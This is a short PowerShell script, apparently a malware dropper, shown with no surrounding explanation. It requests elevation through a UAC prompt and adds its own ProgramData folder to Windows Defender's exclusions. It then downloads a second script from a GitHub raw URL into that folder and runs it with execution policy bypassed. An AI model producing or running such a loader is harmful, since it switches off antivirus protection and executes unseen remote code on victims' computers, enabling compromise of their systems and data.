$ErrorActionPreference = 'Continue'
$dir = Join-Path $env:ProgramData 'scr'
$scriptUrl = 'https://raw.githubusercontent.com/cuentatrades0913-max/Script/main/script.ps1'

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

New-Item -ItemType Directory -Path $dir -Force | Out-Null

if (-not $isAdmin) {
    $elev = Join-Path $env:TEMP 'scr_elev.ps1'
    $code = @"
`$ErrorActionPreference = 'Continue'
`$dir = '$dir'
New-Item -ItemType Directory -Path `$dir -Force | Out-Null
try {
    Add-MpPreference -ExclusionPath `$dir -ErrorAction Stop
    Set-Content -LiteralPath (Join-Path `$dir 'excluded.flag') -Value '1'
} catch {
    Set-Content -LiteralPath (Join-Path `$dir 'excluded.flag') -Value "FAIL: `$(`$_.Exception.Message)"
}
"@
    Set-Content -LiteralPath $elev -Value $code -Encoding ASCII
    try {
        Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$elev`"" -Wait
    } catch {
        Set-Content -LiteralPath (Join-Path $dir 'excluded.flag') -Value 'UAC cancelled'
    }
    Remove-Item -LiteralPath $elev -Force -ErrorAction SilentlyContinue
} else {
    try {
        Add-MpPreference -ExclusionPath $dir -ErrorAction Stop
        Set-Content -LiteralPath (Join-Path $dir 'excluded.flag') -Value '1'
    } catch {
        Set-Content -LiteralPath (Join-Path $dir 'excluded.flag') -Value "FAIL: $($_.Exception.Message)"
    }
}

$target = Join-Path $dir 'script.ps1'
try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $target -UseBasicParsing -TimeoutSec 60
} catch {
    Write-Host "No se pudo descargar script.ps1: $($_.Exception.Message)"
    exit 1
}

powershell -NoProfile -ExecutionPolicy Bypass -File $target
